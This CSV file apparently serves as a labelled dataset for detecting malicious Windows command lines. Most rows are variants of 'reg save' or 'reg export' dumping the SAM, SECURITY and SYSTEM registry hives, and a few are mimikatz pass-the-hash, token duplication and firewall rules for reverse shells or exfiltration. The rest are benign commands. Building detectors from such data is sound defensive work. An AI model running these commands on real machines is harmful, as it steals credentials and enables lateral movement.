text,label
reg save hklm\security c:\windows\temp\vi40tr8u.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\7la7t0ix.dat""",1
reg export hklm\sam c:\windows\temp\7majv4d7.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\9rcqm1o8.dat""",1
"cmd.exe /c ""rule:  reverse  shell  |  app:  c:\users\public\malware.exe  |  dir:  outbound  |  act:  allow  |  port:  tcp  8888""",2
"cmd.exe /c ""reg save hklm\sam c:\temp\5xj78iom.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\1fcprtzj.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\283jg9s4.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\ccc6phqj.dat""",1
klist  purge,3
"powershell -nop -c ""reg save hklm\sam c:\temp\0m20zggh.dat""",1
reg save hklm\security c:\windows\temp\3vy64f5k.save,1
reg export hklm\sam c:\windows\temp\tjjvqy4v.save,1
reg export hklm\system c:\windows\temp\hsir04zv.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\b3wrxioy.dat""",1
reg save hklm\system c:\windows\temp\xzlo3q7e.save,1
reg  export  hklm\system  c:\windows\temp\ooqatmyt.save,1
reg export hklm\sam c:\windows\temp\a4r3n8hw.save,1
reg save hklm\sam c:\windows\temp\kb3ettdi.save,1
reg export hklm\security c:\windows\temp\8m17qok3.save,1
reg export hklm\sam c:\windows\temp\24okg5um.save,1
"powershell -nop -c ""reg  export  hklm\system  c:\windows\temp\wzaqksz9.save""",1
reg save hklm\system c:\windows\temp\q5l3jbs6.save,1
reg save hklm\security c:\windows\temp\vqy5uhct.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\rfu5co9b.dat""",1
"cmd.exe /c ""reg   export   hklm\security   c:\windows\temp\bzzez3n0.save""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\tzoowwcq.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\z7i6cse8.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\ndh76fdf.dat""",1
"cmd.exe /c ""wmic   product   get   name,   version""",0
reg save hklm\security c:\windows\temp\dgveh8y7.save,1
reg export hklm\security c:\windows\temp\8c3fntho.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\hiq0k6e4.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\rrf5v7i6.dat""",1
"powershell   -nop   -c   ""reg   export   hklm\security   c:\temp\v39de5gk.dat""",1
reg export hklm\security c:\windows\temp\luawuied.save,1
reg save hklm\sam c:\windows\temp\gvwpszb0.save,1
reg export hklm\sam c:\windows\temp\fghvje9i.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\fxd2wuyg.dat""",1
reg export hklm\security c:\windows\temp\uhll3xkr.save,1
reg   export   hklm\system   c:\windows\temp\87evpv70.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\n6oi0j1r.dat""",1
sekurlsa::pth,3
"powershell -nop -c ""reg save hklm\security c:\temp\pp7bnahf.dat""",1
reg save hklm\system c:\windows\temp\go35eiuw.save,1
"powershell   -nop   -c   ""reg   save   hklm\security   c:\temp\3zbg33ku.dat""",1
"cmd.exe /c ""powershell -nop -c ""reg export hklm\sam c:\temp\ysjw8byr.dat""""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\61w435kg.dat""",1
reg export hklm\security c:\windows\temp\q13vczu0.save,1
reg save hklm\security c:\windows\temp\6xjq127o.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\n2chmxne.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\1xlc4797.dat""",1
reg save hklm\security c:\windows\temp\gpqmtgq2.save,1
"cmd.exe /c ""reg save hklm\system c:\windows\temp\946mwflp.save""",1
"powershell -nop -c ""powershell   -nop   -c   ""reg   export   hklm\security   c:\temp\ngoop6gz.dat""""",1
"powershell -nop -c ""powershell   -nop   -c   ""reg   save   hklm\security   c:\temp\sx2pmrq5.dat""""",1
reg export hklm\sam c:\windows\temp\lguoxx9w.save,1
"cmd.exe /c ""rule: exfil data | app: any | dir: outbound | act: allow | port: tcp 8888""",2
"cmd.exe /c ""java  -jar  application.jar""",0
reg export hklm\system c:\windows\temp\vxcr9o0f.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\zvvgbixm.dat""",1
reg export hklm\system c:\windows\temp\vemazaux.save,1
"powershell -nop -c ""rule:   exfil   data   |   app:   any   |   dir:   outbound   |   act:   allow   |   port:   1337""",2
"cmd.exe /c ""reg export hklm\sam c:\temp\rn419xtn.dat""",1
reg export hklm\security c:\windows\temp\h14z6hw4.save,1
reg export hklm\security c:\windows\temp\89mcypfn.save,1
"powershell -nop -c ""[dllimport(""advapi32.dll"")]  extern  bool  duplicatetokenex(...)""",3
"cmd.exe /c ""reg export hklm\sam c:\temp\q5wsa6qe.dat""",1
reg save hklm\sam c:\windows\temp\460o2klr.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\syzuz3xv.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\bd0racdl.dat""",1
reg export hklm\system c:\windows\temp\swxncmyt.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\ilapspyd.dat""",1
"cmd.exe  /c  ""reg  save  hklm\security  c:\temp\s42kd0r7.dat""",1
ping  8.8.8.8,0
"powershell -nop -c ""reg save hklm\sam c:\temp\jn31ir48.dat""",1
reg export hklm\sam c:\windows\temp\091xg9ml.save,1
reg save hklm\security c:\windows\temp\0nl25bpx.save,1
reg export hklm\security c:\windows\temp\12ebxyf7.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\c90jbwc5.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\mnr2k5hs.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\ln6t4p30.dat""",1
reg export hklm\sam c:\windows\temp\oeokln1d.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\3jw1crik.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\urmho43p.dat""",1
reg export hklm\security c:\windows\temp\t18odauw.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\ysilo9pm.dat""",1
reg save hklm\sam c:\windows\temp\6ojc6h03.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\ug8y9as1.dat""",1
"cmd.exe /c ""rule:  c2  beacon  |  app:  c:\users\public\malware.exe  |  dir:  outbound  |  act:  allow  |  port:  tcp  8888""",2
"powershell -nop -c ""reg save hklm\security c:\temp\h7gkitbu.dat""",1
"wmic  product  get  name,  version",0
reg export hklm\system c:\windows\temp\1klcumow.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\xuquhnt6.dat""",1
reg save hklm\security c:\windows\temp\k93fmwmn.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\jn5d7o1e.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\865gcj6c.dat""",1
reg export hklm\sam c:\windows\temp\ecd1mee7.save,1
"cmd.exe /c ""cmd.exe   /c   ""reg   save   hklm\security   c:\temp\6seo52b1.dat""""",1
"cmd.exe /c ""reg save hklm\security c:\temp\mydvd1xr.dat""",1
"cmd.exe /c ""cmd.exe /c ""reg export hklm\security c:\temp\s1msxva2.dat""""",1
"powershell -nop -c ""reg export hklm\security c:\temp\5fshcxrv.dat""",1
reg export hklm\security c:\windows\temp\a53uhez3.save,1
reg export hklm\security c:\windows\temp\br2jgn2s.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\iko8yqp9.dat""",1
reg save hklm\system c:\windows\temp\xkwc6ddv.save,1
reg export hklm\sam c:\windows\temp\nt7qicch.save,1
reg export hklm\system c:\windows\temp\7irwjgd0.save,1
